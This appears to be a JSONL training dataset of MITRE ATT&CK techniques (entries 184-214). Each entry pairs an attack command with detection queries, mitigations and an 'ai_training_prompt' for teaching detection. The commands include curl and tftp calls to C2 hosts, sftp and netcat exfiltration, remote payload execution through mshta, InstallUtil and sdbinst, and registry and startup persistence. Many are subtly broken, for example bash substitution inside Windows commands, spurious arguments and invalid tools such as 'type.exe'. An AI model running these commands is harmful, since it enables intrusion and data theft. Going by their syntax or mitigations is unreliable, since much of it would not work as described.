{"id":184,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using curl to communicate with C2 server via HTTPS.","command":"curl -s -o /dev/null https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)","detection":"Monitor curl HTTPS: `wmic process where name='curl.exe' get commandline | findstr https`; Monitor HTTPS traffic: `netstat -anp | grep :443`.","mitigation":"Restrict curl: `icacls %programfiles%\\Git\\mingw64\\bin\\curl.exe /deny Everyone:RX`; Block HTTPS C2: `netsh advfirewall firewall add rule name='Block curl HTTPS' dir=out program='%programfiles%\\Git\\mingw64\\bin\\curl.exe' action=block`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect curl HTTPS C2 and suggest firewall rules."}
{"id":185,"tactic":"Persistence","technique":"T1546.014: Emond","threat":"Abusing emond on macOS to execute payload via modified plist.","command":"echo 'command=/bin/bash -c \"/tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\"' > /etc/emond.d/rules/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).plist && launchctl load /etc/emond.d/rules/*","detection":"Monitor emond plists: `ls /etc/emond.d/rules`; Audit file changes: `auditctl -w /etc/emond.d -p wa`.","mitigation":"Restrict emond rules: `chmod 700 /etc/emond.d`; Disable emond: `launchctl unload /System/Library/LaunchDaemons/com.apple.emond.plist`.","references":["MITRE ATT&CK T1546.014: https://attack.mitre.org/techniques/T1546/014/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect emond plist tampering and suggest access controls."}
{"id":186,"tactic":"Defense Evasion","technique":"T1218.001: Compiled HTML File","threat":"Using hh.exe to execute malicious CHM file remotely.","command":"hh http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).chm) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor hh remote: `wmic process where name='hh.exe' get commandline | findstr http`; YARA rule: `rule HhRemoteChm { strings: $a = /hh.*http.*chm/ nocase; condition: $a }`.","mitigation":"Restrict hh: `icacls %windir%\\hh.exe /deny Everyone:RX`; Block CHM downloads: `netsh advfirewall firewall add rule name='Block hh' dir=out program='%windir%\\hh.exe' action=block`.","references":["MITRE ATT&CK T1218.001: https://attack.mitre.org/techniques/T1218/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect hh remote CHM execution and suggest firewall rules."}
{"id":187,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using nbtstat.exe to execute malicious script via network reconnaissance.","command":"nbtstat -A $(cat /dev/urandom | tr -dc '0-9' | head -c 3).$(cat /dev/urandom | tr -dc '0-9' | head -c 3).$(cat /dev/urandom | tr -dc '0-9' | head -c 3).$(cat /dev/urandom | tr -dc '0-9' | head -c 3) && cmd /c C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bat)","detection":"Monitor nbtstat: `wmic process where name='nbtstat.exe' get commandline | findstr -A`; Event ID 4688.","mitigation":"Restrict nbtstat: `icacls %windir%\\System32\\nbtstat.exe /deny Everyone:RX`; Monitor network activity: `netsh advfirewall firewall add rule name='Log NBT' dir=out action=allow enable=yes`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect nbtstat abuse and suggest network monitoring."}
{"id":188,"tactic":"Exfiltration","technique":"T1048.002: Exfiltration Over Asymmetric Encrypted Protocol","threat":"Using sftp to exfiltrate data to remote SFTP server.","command":"echo put C:\\$(echo data$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt) | sftp $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com","detection":"Monitor sftp: `wmic process where name='sftp.exe' get commandline | findstr put`; Monitor SFTP traffic: `netstat -anp | grep :22`.","mitigation":"Restrict sftp: `icacls %programfiles%\\OpenSSH\\sftp.exe /deny Everyone:RX`; Block SFTP outbound: `netsh advfirewall firewall add rule name='Block SFTP' dir=out action=block protocol=TCP remoteport=22`.","references":["MITRE ATT&CK T1048.002: https://attack.mitre.org/techniques/T1048/002/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect sftp exfiltration and suggest SFTP restrictions."}
{"id":189,"tactic":"Persistence","technique":"T1546.010: AppInit DLLs","threat":"Registering malicious AppInit DLL via HKLM for persistence.","command":"reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /t REG_SZ /d \"C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor AppInit: `reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs`; Event ID 4657.","mitigation":"Disable AppInit: `reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v LoadAppInit_DLLs /t REG_DWORD /d 0`; Restrict registry writes.","references":["MITRE ATT&CK T1546.010: https://attack.mitre.org/techniques/T1546/010/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect AppInit DLL registrations in HKLM and suggest disabling AppInit."}
{"id":190,"tactic":"Defense Evasion","technique":"T1218.014: MMC","threat":"Using mmc.exe to execute malicious MSC file remotely.","command":"mmc http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msc) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor mmc remote: `wmic process where name='mmc.exe' get commandline | findstr http`; YARA rule: `rule MmcRemoteMsc { strings: $a = /mmc.*http.*msc/ nocase; condition: $a }`.","mitigation":"Restrict mmc: `icacls %windir%\\System32\\mmc.exe /deny Everyone:RX`; Block MSC downloads: `netsh advfirewall firewall add rule name='Block mmc' dir=out program='%windir%\\System32\\mmc.exe' action=block`.","references":["MITRE ATT&CK T1218.014: https://attack.mitre.org/techniques/T1218/014/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mmc remote MSC execution and suggest firewall rules."}
{"id":191,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse tasklist.exe for process enumeration.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; tasklist /v | findstr $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) > $(echo proc$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor tasklist: `wmic process where name='tasklist.exe' get commandline | findstr /v`; Event ID 4688.","mitigation":"Restrict tasklist: `icacls %windir%\\System32\\tasklist.exe /deny Everyone:RX`; Audit process enumeration: `auditpol /set /subcategory:'Process Creation' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect tasklist process enumeration and suggest access controls."}
{"id":192,"tactic":"Command and Control","technique":"T1071.002: Application Layer Protocol: File Transfer Protocols","threat":"Using tftp to communicate with C2 server.","command":"tftp -i $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com GET $(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bin) C:\\$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bin)","detection":"Monitor tftp: `wmic process where name='tftp.exe' get commandline | findstr GET`; Monitor TFTP traffic: `netstat -anp | grep :69`.","mitigation":"Restrict tftp: `icacls %windir%\\System32\\tftp.exe /deny Everyone:RX`; Block TFTP outbound: `netsh advfirewall firewall add rule name='Block TFTP' dir=out action=block protocol=UDP remoteport=69`.","references":["MITRE ATT&CK T1071.002: https://attack.mitre.org/techniques/T1071/002/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect tftp C2 communication and suggest TFTP restrictions."}
{"id":193,"tactic":"Persistence","technique":"T1546.002: Screensaver","threat":"Using malicious screensaver remotely for persistence.","command":"copy $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).scr) %windir%\\System32 && reg add \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).scr) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor screensaver changes: `reg query \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE | findstr http`; Event ID 4657.","mitigation":"Restrict screensaver writes: `icacls %windir%\\System32\\*.scr /deny Everyone:WX`; Disable screensavers: `reg add \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 0`.","references":["MITRE ATT&CK T1546.002: https://attack.mitre.org/techniques/T1546/002/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect remote screensaver installations and suggest registry protections."}
{"id":194,"tactic":"Defense Evasion","technique":"T1218.004: InstallUtil","threat":"Using InstallUtil.exe to execute malicious .NET binary remotely.","command":"InstallUtil /logfile= /LogToConsole=false /U http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor InstallUtil remote: `wmic process where name='InstallUtil.exe' get commandline | findstr http`; YARA rule: `rule InstallUtilRemote { strings: $a = /InstallUtil.*http.*exe/ nocase; condition: $a }`.","mitigation":"Restrict InstallUtil: `icacls %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /deny Everyone:RX`; Block .NET downloads: `netsh advfirewall firewall add rule name='Block InstallUtil' dir=out program='%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe' action=block`.","references":["MITRE ATT&CK T1218.004: https://attack.mitre.org/techniques/T1218/004/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect InstallUtil remote execution and suggest firewall rules."}
{"id":195,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using ping.exe to execute malicious script via network reconnaissance.","command":"ping -n 1 $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com && cmd /c C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bat)","detection":"Monitor ping: `wmic process where name='ping.exe' get commandline | findstr com`; Event ID 4688.","mitigation":"Restrict ping: `icacls %windir%\\System32\\ping.exe /deny Everyone:RX`; Monitor network activity: `netsh advfirewall firewall add rule name='Log Ping' dir=out action=allow enable=yes`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect ping abuse and suggest network monitoring."}
{"id":196,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol","threat":"Using netcat to exfiltrate data over UDP.","command":"type C:\\$(echo data$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt) | nc -u $(cat /dev/urandom | tr -dc '0-9' | head -c 3).$(cat /dev/urandom | tr -dc '0-9' | head -c 3).$(cat /dev/urandom | tr -dc '0-9' | head -c 3).$(cat /dev/urandom | tr -dc '0-9' | head -c 3) $(shuf -i 1000-65535 -n 1)","detection":"Monitor netcat: `wmic process where name='nc.exe' get commandline | findstr -u`; Monitor UDP traffic: `netstat -anp | grep UDP`.","mitigation":"Restrict netcat: `icacls %programfiles%\\Netcat\\nc.exe /deny Everyone:RX`; Block UDP outbound: `netsh advfirewall firewall add rule name='Block UDP' dir=out action=block protocol=UDP`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect netcat UDP exfiltration and suggest UDP restrictions."}
{"id":197,"tactic":"Persistence","technique":"T1546.011: Application Shimming","threat":"Registering malicious shim database remotely via sdbinst.","command":"sdbinst /q http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo shim$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sdb)","detection":"Monitor sdbinst remote: `wmic process where name='sdbinst.exe' get commandline | findstr http`; Event ID 4688.","mitigation":"Restrict sdbinst: `icacls %windir%\\System32\\sdbinst.exe /deny Everyone:RX`; Block shim downloads: `netsh advfirewall firewall add rule name='Block sdbinst' dir=out program='%windir%\\System32\\sdbinst.exe' action=block`.","references":["MITRE ATT&CK T1546.011: https://attack.mitre.org/techniques/T1546/011/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect remote shim database installations and suggest firewall rules."}
{"id":198,"tactic":"Defense Evasion","technique":"T1218.012: Verclsid","threat":"Using verclsid.exe to execute malicious COM object remotely.","command":"verclsid /S /C {$(uuidgen)} /I http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor verclsid remote: `wmic process where name='verclsid.exe' get commandline | findstr http`; YARA rule: `rule VerclsidRemoteDll { strings: $a = /verclsid.*http.*dll/ nocase; condition: $a }`.","mitigation":"Restrict verclsid: `icacls %windir%\\System32\\verclsid.exe /deny Everyone:RX`; Block COM downloads: `netsh advfirewall firewall add rule name='Block verclsid' dir=out program='%windir%\\System32\\verclsid.exe' action=block`.","references":["MITRE ATT&CK T1218.012: https://attack.mitre.org/techniques/T1218/012/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect verclsid remote COM execution and suggest firewall rules."}
{"id":199,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse gpresult.exe for policy reconnaissance.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; gpresult /R > $(echo policy$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor gpresult: `wmic process where name='gpresult.exe' get commandline | findstr /R`; Event ID 4688.","mitigation":"Restrict gpresult: `icacls %windir%\\System32\\gpresult.exe /deny Everyone:RX`; Audit policy queries: `auditpol /set /subcategory:'Policy Change' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect gpresult policy reconnaissance and suggest access controls."}
{"id":200,"tactic":"Command and Control","technique":"T1071.003: Application Layer Protocol: Mail Protocols","threat":"Using PowerShell to send C2 commands via SMTP.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Send-MailMessage -To '$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@example.com' -From '$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@example.com' -Subject '$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)' -Body '$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)' -SmtpServer $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com\"","detection":"Monitor SMTP activity: `wmic process where name='powershell.exe' get commandline | findstr Send-MailMessage`; Monitor SMTP traffic: `netstat -anp | grep :25`.","mitigation":"Restrict PowerShell SMTP: `Set-ExecutionPolicy Restricted`; Block SMTP outbound: `netsh advfirewall firewall add rule name='Block SMTP' dir=out action=block protocol=TCP remoteport=25`.","references":["MITRE ATT&CK T1071.003: https://attack.mitre.org/techniques/T1071/003/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell SMTP C2 and suggest SMTP restrictions."}
{"id":201,"tactic":"Collection","technique":"T1115: Clipboard Data","threat":"Using PowerShell to capture clipboard data for collection.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-Clipboard > C:\\$(echo clip$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor clipboard access: `wmic process where name='powershell.exe' get commandline | findstr Get-Clipboard`; Event ID 4688.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Monitor clipboard access: Use EDR solutions.","references":["MITRE ATT&CK T1115: https://attack.mitre.org/techniques/T1115/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell clipboard data collection and suggest execution policy restrictions."}
{"id":202,"tactic":"Reconnaissance","technique":"T1087.001: Account Discovery: Local Account","threat":"Using quser.exe to enumerate logged-in users.","command":"quser | findstr $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) > $(echo users$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor quser: `wmic process where name='quser.exe' get commandline | findstr findstr`; Event ID 4688.","mitigation":"Restrict quser: `icacls %windir%\\System32\\quser.exe /deny Everyone:RX`; Audit account discovery: `auditpol /set /subcategory:'Logon' /success:enable`.","references":["MITRE ATT&CK T1087.001: https://attack.mitre.org/techniques/T1087/001/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect quser account enumeration and suggest access controls."}
{"id":203,"tactic":"Lateral Movement","technique":"T1021.002: Remote Services: SMB/Windows Admin Shares","threat":"Using net.exe to access admin share for lateral movement.","command":"net use \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\C$ /user:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) && copy $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\C$\\$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)","detection":"Monitor net use: `wmic process where name='net.exe' get commandline | findstr C$`; Event ID 5145.","mitigation":"Disable admin shares: `reg add HKLM\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v AutoShareWks /t REG_DWORD /d 0`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect SMB admin share access and suggest share restrictions."}
{"id":204,"tactic":"Persistence","technique":"T1547.001: Registry Run Keys / Startup Folder","threat":"Adding malicious executable to startup folder for persistence.","command":"copy $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\$(echo startup$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor startup folder: `dir \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" | findstr exe`; Event ID 4657.","mitigation":"Restrict startup folder writes: `icacls \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" /deny Everyone:WX`; Audit file changes: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1547.001: https://attack.mitre.org/techniques/T1547/001/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect startup folder tampering and suggest file protections."}
{"id":205,"tactic":"Defense Evasion","technique":"T1218.011: Rundll32","threat":"Using rundll32 to execute malicious payload via ieframe.dll.","command":"rundll32 ieframe.dll,OpenURL \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).html) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor rundll32 ieframe: `wmic process where name='rundll32.exe' get commandline | findstr ieframe`; YARA rule: `rule Rundll32Ieframe { strings: $a = /rundll32.*ieframe.*http/ nocase; condition: $a }`.","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Block ieframe execution: AppLocker.","references":["MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect rundll32 ieframe execution and suggest AppLocker policies."}
{"id":206,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using forfiles to execute malicious script based on file search.","command":"forfiles /p C:\\ /s /m *.txt /c \"cmd /c C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bat) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor forfiles: `wmic process where name='forfiles.exe' get commandline | findstr cmd`; Event ID 4688.","mitigation":"Restrict forfiles: `icacls %windir%\\System32\\forfiles.exe /deny Everyone:RX`; Audit script execution: `auditpol /set /subcategory:'Process Creation' /success:enable`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect forfiles script execution and suggest access controls."}
{"id":207,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using type.exe to collect sensitive files from system directories.","command":"type %windir%\\System32\\drivers\\etc\\hosts > $(echo data$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor type: `wmic process where name='type.exe' get commandline | findstr hosts`; Event ID 4663.","mitigation":"Restrict type: `icacls %windir%\\System32\\type.exe /deny Everyone:RX`; Protect sensitive files: `icacls %windir%\\System32\\drivers\\etc\\hosts /deny Everyone:R`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect type.exe data collection and suggest file protections."}
{"id":208,"tactic":"Lateral Movement","technique":"T1021.006: Remote Services: Windows Remote Management","threat":"Using winrm to execute commands on remote host.","command":"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=\"powershell -c 'I$(echo malicious | base64 -w0)'\"} -r:http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com","detection":"Monitor winrm: `wmic process where name='winrm.cmd' get commandline | findstr invoke`; Event ID 4688.","mitigation":"Disable WinRM: `Disable-PSRemoting -Force`; Block WinRM: `netsh advfirewall firewall add rule name='Block WinRM' dir=in action=block protocol=TCP localport=5985`.","references":["MITRE ATT&CK T1021.006: https://attack.mitre.org/techniques/T1021/006/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect WinRM remote execution and suggest service restrictions."}
{"id":209,"tactic":"Persistence","technique":"T1546.004: Unix Shell Configuration Modification","threat":"Injecting malicious code into profile for persistence on Linux.","command":"echo 'bash -c \"/tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\"' >> ~/.profile","detection":"Monitor profile changes: `cat ~/.profile | grep bash`; Audit file changes: `auditctl -w ~/.profile -p wa`.","mitigation":"Restrict profile writes: `chmod 600 ~/.profile`; Monitor shell configuration changes.","references":["MITRE ATT&CK T1546.004: https://attack.mitre.org/techniques/T1546/004/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect profile tampering and suggest file protections."}
{"id":210,"tactic":"Defense Evasion","technique":"T1218.005: Mshta","threat":"Using mshta.exe to execute malicious VBScript remotely.","command":"mshta vbscript:Execute(\"CreateObject(\\\"WScript.Shell\\\").Run(\\\"powershell -c 'I$(echo malicious | base64 -w0)'\\\"):window.close\") http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).vbs)","detection":"Monitor mshta remote VBScript: `wmic process where name='mshta.exe' get commandline | findstr http`; YARA rule: `rule MshtaRemoteVBS { strings: $a = /mshta.*http.*vbscript/ nocase; condition: $a }`.","mitigation":"Restrict mshta: `icacls %windir%\\System32\\mshta.exe /deny Everyone:RX`; Block VBScript downloads: `netsh advfirewall firewall add rule name='Block mshta' dir=out program='%windir%\\System32\\mshta.exe' action=block`.","references":["MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mshta remote VBScript execution and suggest firewall rules."}
{"id":211,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse print.exe for printer-based payload execution.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; print /D:\\\\.\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).ps1)\"","detection":"Monitor print: `wmic process where name='print.exe' get commandline | findstr ps1`; Event ID 4688.","mitigation":"Restrict print: `icacls %windir%\\System32\\print.exe /deny Everyone:RX`; Disable print spooler: `sc config spooler start= disabled`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect print.exe abuse and suggest service restrictions."}
{"id":212,"tactic":"Collection","technique":"T1113: Screen Capture","threat":"Using PowerShell to capture screenshot for data collection.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds | % { $b = New-Object System.Drawing.Bitmap $_.Width,$_.Height; $g = [System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$b.Size); $b.Save('C:\\$(echo screen$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).png)') }\"","detection":"Monitor screenshot activity: `wmic process where name='powershell.exe' get commandline | findstr System.Drawing`; Event ID 4688.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Monitor file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1113: https://attack.mitre.org/techniques/T1113/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell screenshot capture and suggest execution policy restrictions."}
{"id":213,"tactic":"Lateral Movement","technique":"T1021.001: Remote Desktop Protocol","threat":"Using mstsc.exe to initiate malicious RDP session.","command":"mstsc /v:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com /f /admin && powershell -c 'I$(echo malicious | base64 -w0)'","detection":"Monitor mstsc: `wmic process where name='mstsc.exe' get commandline | findstr /v`; Event ID 4624.","mitigation":"Restrict mstsc: `icacls %windir%\\System32\\mstsc.exe /deny Everyone:RX`; Disable RDP: `reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f`.","references":["MITRE ATT&CK T1021.001: https://attack.mitre.org/techniques/T1021/001/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect mstsc RDP abuse and suggest RDP restrictions."}
{"id":214,"tactic":"Persistence","technique":"T1547.009: Shortcut Modification","threat":"Modifying desktop shortcut to execute malicious payload.","command":"copy %userprofile%\\Desktop\\*.lnk %temp%\\$(echo lnk$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).lnk) && reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders /v Desktop /t REG_SZ /d \"powershell -c 'I$(echo malicious | base64 -w0)'\"","detection":"Monitor shortcut changes: `dir %userprofile%\\Desktop\\*.lnk /a`; Event ID 4657.","mitigation":"Restrict shortcut writes: `icacls %userprofile%\\Desktop /deny Everyone:WX`; Audit shortcut modifications: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1547.009: https://attack.mitre.org/techniques/T1547/009/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect desktop shortcut tampering and suggest file protections."}
